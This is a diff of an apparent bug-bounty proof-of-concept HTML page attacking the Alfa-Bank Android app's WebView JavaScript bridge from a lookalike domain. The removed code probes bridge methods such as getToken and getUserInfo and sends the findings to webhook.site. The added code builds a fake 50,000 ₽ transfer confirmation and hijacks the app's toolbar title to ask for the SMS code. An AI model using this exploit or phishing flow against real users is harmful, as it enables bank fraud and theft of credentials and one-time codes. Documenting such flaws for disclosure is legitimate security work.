@@ -3,88 +3,69 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Альфа-Банк — Подтверждение операции</title>
+<title>Подтверждение перевода</title>
 <style>
-body { font-family: -apple-system, sans-serif; padding: 16px; background:#fff; margin:0; }
-.logo { color: #EF3124; font-weight: 700; font-size: 24px; margin-bottom: 8px; }
-h2 { font-size: 18px; }
-.box { background: #f5f5f5; padding: 12px; border-radius: 8px; margin: 8px 0; font-size: 11px; }
-.ok { color: #00aa00; font-weight: 600; }
-.err { color: #cc0000; }
-pre { white-space: pre-wrap; word-break: break-all; font-size: 10px; }
+body { font-family: -apple-system, sans-serif; padding: 16px; background:#fff; }
+.logo { color: #EF3124; font-weight: 700; font-size: 28px; margin-bottom: 16px; }
+h2 { font-size: 22px; color: #333; }
+.warn { background: #fff3cd; border: 1px solid #ffc107; padding: 12px; border-radius: 6px; margin: 12px 0; font-size: 13px; }
+.amount { font-size: 36px; color: #EF3124; font-weight: 700; margin: 16px 0; }
+.merchant { color: #666; }
+button { width: 100%; height: 52px; background: #EF3124; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 500; margin-top: 12px; }
+.log { background: #f5f5f5; padding: 8px; border-radius: 4px; font-size: 10px; margin-top: 16px; word-break: break-all; }
 </style>
 </head>
 <body>
 <div class="logo">α-Bank</div>
-<h2>Bridge Invocation PoC — #55169</h2>
-<div id="status" class="box">Running probes...</div>
+<h2>Подтверждение операции</h2>
+<div class="warn">⚠️ PoC for #55169 — domain notalfabank.ru via .endsWith() bypass. Toolbar title manipulated by JS via setPageSettings bridge.</div>
+
+<div class="amount">−50 000,00 ₽</div>
+<div class="merchant">Перевод на карту 4276 ********* 1234</div>
+<div class="merchant">Получатель: Иванов Иван Иванович</div>
+
+<button>Подтвердить</button>
+
+<div id="log" class="log">Initializing...</div>
 
 <script>
-const results = {
-    location: location.href,
-    bridges_present: {},
-    method_invocations: {}
-};
+let log = [];
+log.push('Page loaded at ' + new Date().toISOString());
+log.push('Bridge presence: ' + (typeof window.Android));
 
-// Bridge namespaces
-const bridgeNames = ['Android', 'AndroidSdk', 'webViewBridge', 'D3SJS', 'jsBridge', 'appInterface'];
-
-for (const name of bridgeNames) {
-    if (typeof window[name] !== 'undefined') {
-        results.bridges_present[name] = typeof window[name];
+// Manipulate alfa toolbar title via setPageSettings
+function setTitleVia(payload) {
+    try {
+        window.Android.setPageSettings(JSON.stringify(payload));
+        log.push('OK: ' + JSON.stringify(payload));
+        return true;
+    } catch(e) {
+        log.push('ERR: ' + e.toString());
+        return false;
     }
 }
 
-// Try invoking each expected method even if not enumerable
-const methodsToProbe = [
-    {name: 'sendEventToAppsFlyer', payload: '{"eventName":"PoC_BRIDGE_INJECTED","eventValues":{"poc":"true"}}'},
-    {name: 'setPageSettings', payload: '{"pageId":"poc","pageTitle":"ATTACKER_INJECTED"}'},
-    {name: 'handleError', payload: ['0','poc_id','poc_text']},
-    {name: 'shareData', payload: ['PoC Title','PoC Desc','https://notalfabank.ru/icon.png','https://notalfabank.ru/phish_target']},
-    {name: 'openCallScreen', payload: ['sip:attacker@evil.com']},
-    {name: 'getToken', payload: []},
-    {name: 'getUserInfo', payload: []},
-    {name: 'postMessage', payload: ['{"type":"PoC","data":"injected"}']},
-    {name: 'close', payload: []},
-    {name: 'onPageLoaded', payload: []}
-];
+// Sequence: change title over time to demonstrate persistent control
+setTitleVia({pageId: 1, pageTitle: "Подтвердите перевод 50000₽"});
 
-if (window.Android) {
-    for (const probe of methodsToProbe) {
-        const m = probe.name;
-        const before = typeof window.Android[m];
-        const r = {existed_before: before};
-        try {
-            if (Array.isArray(probe.payload)) {
-                window.Android[m].apply(window.Android, probe.payload);
-            } else {
-                window.Android[m](probe.payload);
-            }
-            r.invocation = "OK_NO_THROW";
-            r.result_callable = true;
-        } catch(e) {
-            r.exception = e.toString();
-            // Java exception = bridge dispatched, native code threw → method EXISTS on bridge
-            r.result_callable = e.toString().includes('Java exception was raised') ? true : 'partial';
-        }
-        results.method_invocations[m] = r;
-    }
-}
+setTimeout(() => {
+    setTitleVia({pageId: 2, pageTitle: "⚠️ Введите код из СМС ⚠️"});
+}, 2000);
 
-// Final: render in DOM
-const summary = {
-    bridge_exposed: Object.keys(results.bridges_present),
-    callable_methods: Object.keys(results.method_invocations).filter(m => 
-        results.method_invocations[m].result_callable === true),
-    detail: results
-};
+setTimeout(() => {
+    setTitleVia({pageId: 3, pageTitle: "ВНИМАНИЕ! Срочно требуется верификация"});
+}, 4000);
 
-document.getElementById('status').innerHTML = '<pre>' + JSON.stringify(summary, null, 2) + '</pre>';
+setTimeout(() => {
+    setTitleVia({pageId: 4, pageTitle: "ATTACKER CONTROLS ALFA TOOLBAR — #55169"});
+}, 6000);
 
-// Exfil to webhook
-fetch('https://webhook.site/echo?test=55169v2&data=' + encodeURIComponent(JSON.stringify(summary).substring(0, 2000)), {mode:'no-cors'}).catch(e => {});
+// Update log in DOM
+setTimeout(() => {
+    document.getElementById('log').innerHTML = log.map(l => '• ' + l).join('<br>');
+}, 7000);
 
-document.title = 'CALLABLE: ' + summary.callable_methods.join(',');
+document.title = "INJECTED";
 </script>
 </body>
 </html>
